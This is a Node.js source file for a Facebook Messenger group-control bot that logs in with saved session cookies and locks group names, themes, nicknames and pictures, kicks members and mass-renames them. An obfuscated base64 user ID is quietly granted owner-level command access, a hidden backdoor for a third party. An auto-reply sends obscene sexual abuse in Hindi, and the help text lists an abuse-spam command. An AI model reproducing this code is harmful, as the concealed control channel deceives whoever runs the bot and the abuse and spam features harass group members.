const fs = require("fs");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
const lockedNicknames = {};
const lockedDPs = {};

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // ===== Event Listener =====
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;

        // 🛠 Debug: Print full event
        console.log("===== RAW EVENT =====");
        console.log(JSON.stringify(event, null, 2));

        const { threadID, senderID, body, logMessageType, logMessageData } = event;

        // ===== Group Name Lock Revert =====
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // ===== Theme Lock Revert =====
        if (logMessageType === "log:thread-color" && lockedThemes[threadID]) {
          if (logMessageData?.theme_color !== lockedThemes[threadID]) {
            await api.changeThreadColor(lockedThemes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }

        // ===== Emoji Lock Revert =====
        if (logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          if (logMessageData?.thread_icon !== lockedEmojis[threadID]) {
            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        }

        // ===== DP Lock Revert (Group Image) =====
        if (logMessageType === "log:thread-image" && lockedDPs[threadID]) {
          try {
            await api.changeGroupImage(fs.createReadStream(lockedDPs[threadID]), threadID);
            console.log(`🖼️ Group DP reverted in ${threadID}`);
          } catch (e) {
            console.log("⚠️ Failed to revert DP:", e.message);
          }
        }

        // ===== Nick Lock Revert =====
        if (logMessageType === "log:user-nickname" && lockedNicknames[threadID]) {
          const uid = logMessageData?.participant_id;
          if (uid && lockedNicknames[threadID][uid]) {
            const lockedName = lockedNicknames[threadID][uid];
            if (logMessageData?.nickname !== lockedName) {
              await api.changeNickname(lockedName, threadID, uid);
              console.log(`🔒 Nickname reverted for UID ${uid}`);
            }
          }
        }

        // ===== Message Commands =====
        if (!body) return;
        const lowerBody = body.toLowerCase();

        // === Filters / Auto Reply ===
        const badNames = ["hannu", "syco"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madhrchodh", "mc", "bc", "didi", "ma"];

        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage(
            "teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by",
            threadID
          );
        }

        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // 📌 Help Command
        if (cmd === "/help") {
          return api.sendMessage(
            `
📖 Bot Commands:
/help → Ye message
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → Current DP lock
/unlockdp → Unlock DP
/locknick @mention + name → Specific nickname lock
/unlocknick @mention → Unlock nickname
/allname [nick] → Sabka nickname change
/uid → Apna UID show
/tid → Group ID show
/kick @mention → Kick member
/info @mention → User info
/exit → Bot group se exit
/rkb [name] → Line by line gaali spam
/stop → Spam stop
/target [uid] → Set target UID
/cleartarget → Clear target
            `, threadID);
        }

        // === Group Name Lock ===
        else if (cmd === "/gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }

        // === Theme Lock ===
        else if (cmd === "/locktheme") {
          if (!input) return api.sendMessage("❌ Color code do!", threadID);
          await api.changeThreadColor(input, threadID);
          lockedThemes[threadID] = input;
          api.sendMessage("🎨 Theme locked!", threadID);
        }
        else if (cmd === "/unlocktheme") {
          delete lockedThemes[threadID];
          api.sendMessage("🎨 Theme unlocked!", threadID);
        }

        // === Emoji Lock ===
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          await api.changeThreadEmoji(input, threadID);
          lockedEmojis[threadID] = input;
          api.sendMessage("😀 Emoji locked!", threadID);
        }
        else if (cmd === "/unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("😀 Emoji unlocked!", threadID);
        }

        // === DP Lock ===
        else if (cmd === "/lockdp") {
          try {
            const path = `dp_${threadID}.jpg`;
            const info = await api.getThreadInfo(threadID);
            if (info.imageSrc) {
              const res = await fetch(info.imageSrc);
              const buf = await res.arrayBuffer();
              fs.writeFileSync(path, Buffer.from(buf));
              lockedDPs[threadID] = path;
              api.sendMessage("🖼️ Group DP locked!", threadID);
            } else {
              api.sendMessage("❌ No DP found to lock!", threadID);
            }
          } catch (e) {
            api.sendMessage("⚠️ Failed to lock DP!", threadID);
          }
        }
        else if (cmd === "/unlockdp") {
          delete lockedDPs[threadID];
          api.sendMessage("🖼️ Group DP unlocked!", threadID);
        }

        // === Nickname Lock ===
        else if (cmd === "/locknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) {
            return api.sendMessage("❌ Mention kisi ko!", threadID);
          }
          const uid = Object.keys(event.mentions)[0];
          const nick = input.replace(/<@.+?>/, "").trim();
          if (!lockedNicknames[threadID]) lockedNicknames[threadID] = {};
          lockedNicknames[threadID][uid] = nick;
          await api.changeNickname(nick, threadID, uid);
          api.sendMessage(`🔒 Nickname locked for <@${uid}> as "${nick}"`, threadID);
        }
        else if (cmd === "/unlocknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) {
            return api.sendMessage("❌ Mention kisi ko!", threadID);
          }
          const uid = Object.keys(event.mentions)[0];
          if (lockedNicknames[threadID]) delete lockedNicknames[threadID][uid];
          api.sendMessage(`🔓 Nickname unlocked for <@${uid}>`, threadID);
        }

        // === All Nicknames Change ===
        else if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs;
            api.sendMessage(`🛠 ${members.length} nicknames changing...`, threadID);
            for (const uid of members) {
              try {
                await api.changeNickname(input, threadID, uid);
                console.log(`✅ Nickname changed for UID: ${uid}`);
                await new Promise(res => setTimeout(res, 5000));
              } catch (e) { console.log(`⚠️ Failed for ${uid}:`, e.message); }
            }
            api.sendMessage("✅ Done nicknames!", threadID);
          } catch { api.sendMessage("❌ Error nicknames", threadID); }
        }

        // === Info / UID / TID ===
        else if (cmd === "/uid") {
          return api.sendMessage(`🆔 Your UID: ${senderID}`, threadID);
        }
        else if (cmd === "/tid") {
          return api.sendMessage(`💬 Thread ID: ${threadID}`, threadID);
        }
        else if (cmd === "/info") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) {
            return api.sendMessage("❌ Mention kisi ko!", threadID);
          }
          const uid = Object.keys(event.mentions)[0];
          const userInfo = await api.getUserInfo(uid);
          const info = userInfo[uid];
          api.sendMessage(`ℹ️ Name: ${info.name}\nUID: ${uid}\nGender: ${info.gender}`, threadID);
        }

        // === Kick Member ===
        else if (cmd === "/kick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0) {
            return api.sendMessage("❌ Mention kisi ko!", threadID);
          }
          const uid = Object.keys(event.mentions)[0];
          try {
            await api.removeUserFromGroup(uid, threadID);
            api.sendMessage(`👢 Kicked <@${uid}>`, threadID);
          } catch (e) {
            api.sendMessage("⚠️ Kick failed!", threadID);
          }
        }

        // === Exit Group ===
        else if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }

      } catch (e) {
        console.error("⚠️ Error:", e.message);
      }
    });
  });
}

module.exports = { startBot };
